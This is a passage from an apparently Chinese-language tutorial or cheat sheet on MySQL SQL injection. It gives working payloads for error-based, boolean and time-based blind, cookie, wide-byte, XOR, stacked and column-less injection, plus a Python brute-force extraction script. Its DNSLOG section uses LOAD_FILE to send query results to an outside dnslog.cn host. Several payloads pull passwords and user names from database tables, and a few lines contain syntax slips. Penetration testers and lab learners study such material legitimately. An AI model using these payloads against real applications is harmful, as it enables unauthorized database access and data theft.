语句使得数据库软件执行错误，随后服务端将错误反馈到用户端以暴露出<strong>特定信息</strong>的攻击方式。</p><p>一种情况是通过构造错误的参数，使得一些 SQL 语句的错误直接回显在页面上，暴露一些 SQL 语句信息便于使用特定的攻击手段；</p><p>另一种情况是后台没有对一些具有报错功能的函数进行过滤，使得一些关键信息被直接被以报错的形式携带到页面上。</p><p>二者的前提都<strong>基于 WEB 应用程序未关闭数据库的报错函数</strong>。</p><h4 id="updatexml-extractvalue"><a href="#updatexml-extractvalue" class="headerlink" title="updatexml()&#x2F;extractvalue()"></a>updatexml()&#x2F;extractvalue()</h4><p><code>updatexml(XML_document, XPath_string, new_value)</code>:</p><ul><li>XML_document是String格式，为XML文档对象的名称，文中为Doc</li><li>XPath_string (Xpath格式的字符串)</li><li>new_value，String格式，替换查找到的符合条件的数据</li></ul><p><code>extractvalue(XML_document, XPath_string)</code>:与<code>updatexml()</code>类似，只是变成了两个参数</p><p>原理就是<strong>利用XML解析错误，通过构造错误的XPath表达式来触发报错。Xpath语法不允许存在特殊字符串，而我们可以构造0x7e(~)特殊字符来报错</strong></p><p><strong>查库名</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7E,database(),0x7E),1);</span><br><span class="line"></span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7E,database(),0x7E));</span><br></pre></td></tr></table></figure><p><strong>查表名</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7E,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7E),1);</span><br><span class="line"></span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7E,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7E));</span><br></pre></td></tr></table></figure><p><strong>查列名</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7E,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),0x7E),1);</span><br><span class="line"></span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7E,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),0x7E));</span><br></pre></td></tr></table></figure><p><strong>查字段</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7E,(select user from security.users),0x7E),1);</span><br><span class="line"></span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7E,(select user from security.users),0x7E));</span><br></pre></td></tr></table></figure><p>注意由于updatexml() 函数的报错内容长度不能超过32个字符，所以常常配合limit分页获取所有字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIMIT 偏移量, 每页记录数;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select user from mysql.user limit 1,2)),3)</span><br><span class="line">//第一个参数表示跳过一条记录，第二个参数表示返回两条记录，即从第二条开始返回两条记录</span><br></pre></td></tr></table></figure><p>或者利用substr()截取字符串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(user) from mysql.user),1,31)),3)</span><br></pre></td></tr></table></figure><h4 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h4><p><code>exp()</code>:以e为底的指数函数</p><p>在mysql&gt;5.5.53时，则不能返回查询结果</p><p>其中~0表示对0进行按位取反，原理就是<strong>对0取反后会得到最大的BIGINT值，利用他进行报错</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; union select 1,2,exp(~(select * from (select database())a))--+</span><br></pre></td></tr></table></figure><blockquote><p>由于将0按位取反就会返回“18446744073709551615”，再加上函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的<strong>无符号BIGINT值</strong>。<br>通过子查询与按位取反，造成一个<strong>DOUBLE overflow error</strong>，并借由此注出数据。</p></blockquote><h4 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h4><p><code>floor()</code>:向下取整</p><p><code>count()</code>：返回当前列的数量</p><p><code>rand()</code>:取随机数0~1，若有参数x，则每个x对应一个固定的值</p><p>原理就是利用MySQL的<code>GROUP BY</code>与<code>rand()</code>函数的主键冲突特性，通过故意构造重复的临时表键值，触发报错并泄露敏感信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and (select 1 from (select count(*),concat(0x23,(database()),0x23,floor(rand(0)*2)) as x from information_schema.columns group by x) as y)--+</span><br></pre></td></tr></table></figure><p>在上面的payload中，<code>select concat(0x23,(database()),0x23,floor(rand(0)*2))</code>拼接当前数据库名和随机数:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#testdb#1</span><br></pre></td></tr></table></figure><p>简化下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*), x from information_schema.columns group by x</span><br></pre></td></tr></table></figure><p><code>group by x</code>会按字段<code>x</code>分组统计，MySQL会为每个唯一<code>x</code>创建临时表，而我们插入临时表时，x的值被计算了<strong>两次</strong>（<strong>一次用于分组，一次用于插入</strong>），但由于<code>floor(rand(0)*2)</code>的不确定性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT floor(rand(0)*2) FROM ...; </span><br><span class="line">-- 序列：0,1,1,0,1,1,1,...</span><br></pre></td></tr></table></figure><p>此时会导致两次计算结果可能不同，而当插入的值与已有主键冲突时，<strong>MySQL抛出错误并泄露当前计算值</strong>。</p><h4 id="geometrycollection"><a href="#geometrycollection" class="headerlink" title="geometrycollection()"></a>geometrycollection()</h4><p><code>geometrycollection()</code>：用于创建一个几何集合对象，包含多个几何类型的元素。如果传入的参数不符合几何类型的规范，MySQL会抛出错误。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select geometrycollection((select database())));</span><br><span class="line"></span><br><span class="line">1&#x27; and (select geometrycollection((select table_name FROM information_schema.tables WHERE table_schema=database())));</span><br></pre></td></tr></table></figure><h4 id="multipoint"><a href="#multipoint" class="headerlink" title="multipoint()"></a>multipoint()</h4><p>原理：参数不符合多点几何格式（如字符串代替坐标）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select multipoint((select database())));</span><br><span class="line"></span><br><span class="line">1&#x27; and (select multipoint((select table_name FROM information_schema.tables WHERE table_schema=database())));</span><br></pre></td></tr></table></figure><h4 id="polygon"><a href="#polygon" class="headerlink" title="polygon()"></a>polygon()</h4><p>原理：参数非闭合多边形坐标格式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select polygon((select database())));</span><br><span class="line"></span><br><span class="line">1&#x27; and (select polygon((select table_name FROM information_schema.tables WHERE table_schema=database())));</span><br></pre></td></tr></table></figure><h4 id="multilinestring"><a href="#multilinestring" class="headerlink" title="multilinestring()"></a>multilinestring()</h4><p>原理：参数不符合多线几何格式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select multilinestring((select database())));</span><br><span class="line"></span><br><span class="line">1&#x27; and (select multilinestring((select table_name FROM information_schema.tables WHERE table_schema=database())));</span><br></pre></td></tr></table></figure><h4 id="linestring"><a href="#linestring" class="headerlink" title="linestring()"></a>linestring()</h4><p>原理类似于前面的多边形函数，<code>linestring()</code> 是 MySQL 中用于处理 <strong>线几何对象（LineString）</strong> 的空间函数，要求参数必须为有效的点坐标序列（如 <code>POINT(x,y)</code>）。当传入非法参数（如字符串、子查询结果等）时，MySQL 会抛出错误。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select linestring((select database())));</span><br><span class="line"></span><br><span class="line">1&#x27; and (select linestring((select table_name FROM information_schema.tables WHERE table_schema=database())));</span><br></pre></td></tr></table></figure><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>盲注：当存在SQL注入时，攻击者无法通过页面或请求的返回信息，回显或获取到SQL注入语句的执行结果的情况。</p><p>原理：通过SQL注入，利用返回的True或False来判断注入语句是否执行成功。</p><p>适用情况：</p><ul><li><p><strong>该输入框存在注入点</strong>。 </p></li><li><p><strong>该页面或请求不会回显注入语句执行结果，故无法使用union注入</strong>。 </p></li><li><p><strong>对数据库报错进行了处理，无论用户怎么输入都不会显示报错信息，故无法使用报错注入</strong></p></li></ul><p>常用函数：</p><ul><li>length() 返回字符串的长度，例如可以返回数据库名字的长度 。 </li><li>substr() ⽤来截取字符串  。</li><li>ascii() 返回字符的ascii码 。</li><li>sleep(n) 将程序挂起⼀段时间，n为n秒。 </li><li>if(expr1,expr2,expr3) 判断语句 如果第⼀个语句正确就执⾏第⼆个语句如果错误执⾏第三个语句。</li><li>count()：返回当前列的数量</li></ul><p>一般流程：</p><ul><li><p><strong>判断数据库个数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from information_schema.schemata)&gt;6</span><br></pre></td></tr></table></figure></li><li><p><strong>判断数据库名的长度</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and length(database())&gt;11  #回显正常</span><br><span class="line">and length(database())&gt;12  #回显错误</span><br></pre></td></tr></table></figure></li><li><p><strong>猜测数据库名（使用ascii码来依次判断）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (ascii(substr(database(),1,1)))&gt;100 --+</span><br></pre></td></tr></table></figure></li><li><p><strong>判断指定数据库中有多少个表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from information_schema.tables where table_schema=&#x27;demo&#x27;)&gt;4</span><br></pre></td></tr></table></figure></li><li><p><strong>猜测表名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (ascii(substr((select table_name from information_schema.tables where table.schema=database() limit 1,1)1,1)&gt;144 --+</span><br></pre></td></tr></table></figure></li><li><p><strong>判断列个数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from information_schema.columns where table_name=&#x27;user&#x27; and table_schema=&#x27;demo&#x27;)</span><br></pre></td></tr></table></figure></li><li><p><strong>判断列名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (ascii(substr((select column_name from information_schema.columns where table.schema=database() and table_name=&#x27;user&#x27; limit 0,1)1,1)&gt;105 --+</span><br></pre></td></tr></table></figure></li><li><p><strong>猜测字段内容</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (ascii(substr(( select password from demo.user limit 0,1),1,1)))=68--+</span><br></pre></td></tr></table></figure></li></ul><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>适用情况：页面不会返回错误信息，只会回显一种界面。</p><p>原理：通过与if(expr1,expr2,expr3)语句结合使用，利用sleep函数，制造时间延迟，由回显时间来判断是否报错。</p><p>流程：</p><ul><li><p><strong>判断注入类型</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and sleep(5)#</span><br></pre></td></tr></table></figure></li><li><p><strong>获取数据库名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(length(database())=1,sleep(5),1)#</span><br><span class="line"></span><br><span class="line">1&#x27; and if(ascii(substr(database(),1,1))&gt;90,sleep(5),1)#</span><br></pre></td></tr></table></figure></li><li><p><strong>获取表名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#判断表个数</span><br><span class="line">1&#x27; and if((select count(table_name) from information_schema.tables where table_schema=database())=2,sleep(5),1)# </span><br><span class="line"></span><br><span class="line">#获取第一个表名长度</span><br><span class="line">1&#x27; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=9,sleep(5),1) #</span><br><span class="line"></span><br><span class="line">#获取表名</span><br><span class="line">1&#x27; and (select ascii(substr(table_name, 1, 1)) from information_schema.tables where table_schema = &#x27;dvwa&#x27; limit 1) &gt;= 100 and sleep(5)#</span><br></pre></td></tr></table></figure></li><li><p><strong>获取列名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#列个数</span><br><span class="line">1&#x27; and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name= &#x27;guestbook&#x27;)=3,sleep(5),1) # </span><br><span class="line"></span><br><span class="line">#列长度</span><br><span class="line">1&#x27; and if(length((select column_name from information_schema.columns where table_name= &#x27;guestbook&#x27; limit 0,1))=10,sleep(5),1) #</span><br><span class="line"></span><br><span class="line">#列名</span><br><span class="line">1&#x27; and if((select ascii(substr(column_name, 2, 1)) from information_schema.columns where table_name = &#x27;guestbook&#x27; limit 0,1) &gt;= 100, sleep(5), 1) #</span><br></pre></td></tr></table></figure></li><li><p><strong>获取字段</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if((select ascii(substr((select password from security.users limit 0,1),1,1))&gt;=100),sleep(5),1)#</span><br></pre></td></tr></table></figure></li></ul><h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>原理：</p><p>ASP脚本中的request对象被用于从用户那里获取信息。</p><p><strong>而request对象的使用方法：request.[集合名称]（参数名称）效率低下，容易出错</strong></p><blockquote><p>获取从表单中提交的数据：request.form(“参数名称”)</p></blockquote><p><strong>但ASP中规定也可以省略集合名称：request(“参数名称”)，</strong>当使用这样的方式获取数据时，ASP规定按<code>QueryString、Form、Cookie、ServerVariables</code>的顺序来获取数据的。<strong>这样在request.cookies(“参数名称”)提交的数据没进行过滤时就可能存在Cookie注入</strong></p><p>条件：</p><ul><li>对get和post提交的数据进行了过滤，但<strong>未对cookie提交的数据库进行过滤</strong></li><li><strong>程序对提交数据获取方式是直接request(“xxx”)的方式，未指明使用request对象的具体方式进行获取</strong></li></ul><p>流程：</p><ul><li><p><strong>寻找参数位置</strong></p><p>如?id&#x3D;xx这样带参数</p></li><li><p><strong>去掉参数，观察参数影响</strong></p><p>将id&#x3D;xx删掉，看页面是否正常，正常则说明参数不起影响</p></li><li><p><strong>(先清空网址)输入”javascript:alert(document.cookie&#x3D;”id&#x3D;”+escape(“xx”));”</strong></p><p>弹出对话框后重新输入原来UR如果正常就说明<strong>以request(“id”)方式获取数据</strong></p><blockquote><p><strong>document.cookie</strong>:用于设置或获取当前cookie值，在这里是设置</p><p><strong>escape():对字符串进行编码</strong></p></blockquote></li><li><p><strong>判断是否存在漏洞</strong></p><p>带入SQL判断语句:</p><p><strong>javascript:alert(document.cookie&#x3D;”id&#x3D;”+escape(“xx and 1&#x3D;1”));</strong></p><p><strong>javascript:alert(document.cookie&#x3D;”id&#x3D;”+escape(“xx and 1&#x3D;2”));</strong></p><p><strong>若第一个正常，第二个不正常，则存在注入漏洞</strong></p></li><li><p><strong>cookie注入</strong></p><p>构造payload：</p><p><strong>javascript:alert(document.cookie&#x3D;”id&#x3D;”+escape(“xx order by 2”));</strong></p><p><strong>javascript:alert(document.cookie&#x3D;”id&#x3D;”+escape(“284 union select 1,database(),2”));</strong></p><blockquote><p><strong>可以burp抓包修改id值，就不用alert弹窗了，但要将值进行次url编码</strong></p><p><strong>当然除了联合注入也可以用其他注入方式</strong></p></blockquote></li></ul><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p><strong>字符、字符集</strong></p><p>字符是组成字符集的基本单位。对字符赋予一个数值来确定这个字符在该字符集中的位置</p><p><strong>UTF8</strong></p><p><strong>由于ASCII表示的字符只有128个，因此网络世界的规范是使用UNICODE编码，但是用ASCII表示的字符使用UNICODE并不高效。因此出现了中间格式字符集，被称为通用转换格式，即UTF(Universal Transformation Format)。</strong></p><p><strong>宽字节</strong></p><p><strong>如果一个字符的大小是一个字节的，称为窄字节；如果一个字符的大小是两个字节的，称为宽字节</strong></p><ul><li><strong>像GB2312、GBK、GB18030、BIG5、Shift_JIS等这些编码都是常说的宽字节，也就是只有两字节</strong></li><li><strong>英文默认占一个字节，中文占两个字节</strong></li></ul><p><strong>原理</strong></p><p>由于MySQL设置了转义函数，使<strong>输入的函数增添了<code>\</code>转义</strong>，而<strong>GBK占用两字节，ASCII占用一字节</strong></p><p>PHP中编码为UTF-8,函数执行添加的是ASCII编码（<code>\</code>),MySQL默认字符集是GBK等宽字符集</p><p><strong>由于<code>\</code>url转义编码是%5c，而<code>%df&#39;</code>转义后为<code>%df\&#39;</code>,即<code>%df%5c%27</code>,GBK宽字节编码会认为<code>%df%5c</code>是一个宽字节，即<code>運&#39;</code>,从而绕过</strong></p><p>流程：**<code>%df%27 浏览器url自动解码===&gt; β\&#39; 转为16进制===&gt; 0xdf0x5c0x27 转换为url编码===&gt; %df%5c%27 进行url解码(因为是GBK编码，%df和%5c结合为汉字)===&gt; 運&#39;</code>**</p><blockquote><p>常见转义函数即配置：<strong>addslashes、mysql_real_escape_string、mysql_escape_string、php.ini中magic_quote_gpc的配置</strong></p></blockquote><p><strong>条件</strong></p><ul><li><strong>首先要满足目标程序使用双&#x2F;多字节字符集进行解析</strong></li><li><strong>其次不同字符集范围不一样，可能低位不包含单字节字符集的字符，这样就没办法了，所以要保证在该种字符集范围中包含低字节位，比如 0x5C(01011100) 的字符，即转义符\。</strong></li></ul><p><strong>GET传参的宽字节注入</strong></p><p><strong>在引号前面加个<code>%df</code>即可,之后进行正常的注入</strong></p><p><strong>POST传参的宽字节注入</strong></p><p><strong>需要借助burp抓包改包</strong></p><ul><li><strong>正常写入注入语句 ，一般是在引号前写一个字符，并知道此字符对应的ascii码值，方便在包里找到输入数据 ，我比较喜欢用小写a &gt;&gt;&gt;a对应的ascii码值是61</strong></li><li><strong>burp抓包，找到引号前的字符即a，修改其<code>Hex</code>为<code>df</code>即可，后面流程一样</strong></li></ul><h3 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h3><p>原理：通过在构造where后面的判断条件时使用<strong>^（异或符号）或<code>xor</code><strong>来达到sql注入攻击的目的，运算法则是：</strong>两个条件相同（同真或同假）即为假<code>（0）</code>，两个条件不同即为真<code>（1）</code>，<code>null</code>与任何条件做异或运算都为<code>null</code></strong></p><p>因为异或逻辑通常返回的是1和0，所以一般用于<strong>盲注</strong>中。</p><p>应用场景是过滤了union select and or 等一些关键字。还能绕过空格过滤。</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#文字转ascii ord()</span></span><br><span class="line"><span class="comment">#ascii转文字 ascii()</span></span><br><span class="line"></span><br><span class="line">dic = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://test_url/?id=2&#x27;^&quot;</span></span><br><span class="line">keyword = <span class="string">&quot;keyword&quot;</span></span><br><span class="line">string = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">300</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        payload = <span class="string">&quot;!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(schema_name))FROM(information_schema.schemata)),&#123;0&#125;,1))=&#123;1&#125;))^&#x27;1&#x27;=&#x27;1&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i),<span class="built_in">ord</span>(j))</span><br><span class="line">        url_get = url + payload</span><br><span class="line">        <span class="built_in">print</span>(url_get)</span><br><span class="line">        content = requests.get(url_get)</span><br><span class="line">        <span class="keyword">if</span> keyword <span class="keyword">in</span> content.text:</span><br><span class="line">            string += j</span><br><span class="line">            <span class="built_in">print</span>(string)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;result = &quot;</span> + string)</span><br></pre></td></tr></table></figure><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>顾名思义，堆叠注入就是将语句堆叠在一起进行查询，因为<strong>mysql_multi_query()</strong> 支持<strong>多条sql语句同时执行</strong>，但需要<strong>以<code>;</code>分隔开</strong>。如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users;show databases; </span><br></pre></td></tr></table></figure><p>而 union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于<strong>union 或者union all 执行的语句类型是有限的，只可以用来执行查询语句，而堆叠注入可以执行的是任意的语句.</strong></p><h4 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h4><p>有注入点：即存在sql注入漏洞</p><p>未过滤：即<strong>未对”;”号进行过滤</strong></p><p>未禁用：即<strong>未禁止执行多条sql语句</strong></p><h4 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h4><p>利用mysqli_multi_query()函数就支持多条sql语句同时执行</p><p>但实际情况中，PHP为了<strong>防止sql注入机制</strong>，往往使用调用数据库的函数是<strong>mysqli_ query()函数</strong>，其<strong>只能执行一条语句</strong>，分号后面的内容将不会被执行</p><p>mysqli_query()函数:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysqli_query($connection, $query);</span><br><span class="line"> </span><br><span class="line">//$connection：表示与MySQL服务器的连接，可以通过mysqli_connect()函数进行创建。</span><br><span class="line">//$query：表示要执行的SQL查询语句。</span><br></pre></td></tr></table></figure><h3 id="DNSLOG外带注入"><a href="#DNSLOG外带注入" class="headerlink" title="DNSLOG外带注入"></a>DNSLOG外带注入</h3><p>目标站点没有回显，不知道是否利用成功时，就需要DNSLOG注入，即盲注</p><p>Windows中允许使用UNC路径访问网络 <code>\\计算机名或IP地址\共享名称\路径</code></p><p>利用前提：</p><ol><li><strong><code>secure_file_priv=</code>值为空</strong></li><li><strong>目标出网</strong></li><li><strong>有文件读取写入的权限，例如root</strong></li></ol><p>在数据库中执行以下命令，查看DNSLOG平台</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(&#x27;\\\\fekvlt.dnslog.cn\\aa&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/archives/ef8ae29c/image-20241007143442024.png"></p><p>将要查询的内容带出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(&#x27;\\\\&#x27;,(select database()),&#x27;.fekvlt.dnslog.cn\\a&#x27;));</span><br></pre></td></tr></table></figure><h3 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h3><p>在SQL绕过中也提及了在 <strong>mysql &#x3D;&gt; 5</strong> 的版本中存在库<strong>information_schema</strong>,记录着mysql中所有表的结构，通常，在mysql sqli中，我们会通过<strong>此库中的表去获取其他表的结构，即表名，列名等</strong>。但是这个库也会经常被WAF过滤。</p><p>而当<strong>information_schema</strong>库被过滤时我们需要用到**InnoDB 引擎表中的<code>mysql.innodb_table_stats</code>和<code>mysql.innodb_index_stats</code><strong>或</strong>sys库中<code>sys.schema_auto_increment_columns</code>和<code>schema_table_statistics_with_buffer和x$schema_table_statistics_with_buffer</code>**来获取库名和表名，用法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=0&#x27; union select 1,2,(select group_concat(database_name) from mysql.innodb_table_stats)%23</span><br><span class="line"></span><br><span class="line">?id=0&#x27; union select 1,2,(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())%23</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 查询数据库</span><br><span class="line">select table_schema from sys.schema_auto_increment_columns;</span><br><span class="line"># 查询指定数据库的表</span><br><span class="line">select table_name from sys.schema_auto_increment_columns where table_schema=&#x27;security&#x27;;</span><br></pre></td></tr></table></figure><blockquote><p>**<code>sys.schema_auto_increment_columns</code>**用于那些有自增字段表的数据库的信息</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查询数据库</span><br><span class="line">select table_schema from sys.schema_table_statistics_with_buffer;</span><br><span class="line">select table_schema from sys.x$schema_table_statistics_with_buffer;</span><br><span class="line"># 查询指定数据库的表</span><br><span class="line">select table_name from sys.schema_table_statistics_with_buffer where table_schema=&#x27;challenges&#x27;;</span><br><span class="line">select table_name from sys.x$schema_table_statistics_with_buffer where table_schema=&#x27;challenges&#x27;;</span><br></pre></td></tr></table></figure><blockquote><p>**<code>sys.schema_table_statistics_with_buffer</code>和<code>sys.x$schema_table_statistics_with_buffer</code>**用于那些没有自增字段表的数据库的信息</p></blockquote><p>但上面几种查询方法都有一个致命的缺点就是只能查到库名和表名，不能得到完整的字段名，这时就需要无列名注入。</p><ul><li><h4 id="union联合-子查询"><a href="#union联合-子查询" class="headerlink" title="union联合+子查询"></a><strong>union联合+子查询</strong></h4><p>正常情况下的SQL查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test;</span><br></pre></td></tr></table></figure><p><img src="/archives/ef8ae29c/QQ20250110-192953.png"></p><p>可以看到列名为a,b,使用union联合查询：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2 union select * from test;</span><br></pre></td></tr></table></figure><p><img src="/archives/ef8ae29c/QQ20250110-193151.png"></p><p>可以看到我们的列名被替换成了对应的数字，也就是说我们可以继续数字来对应列，如对应b:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select `2` from (select 1,2 union select * from 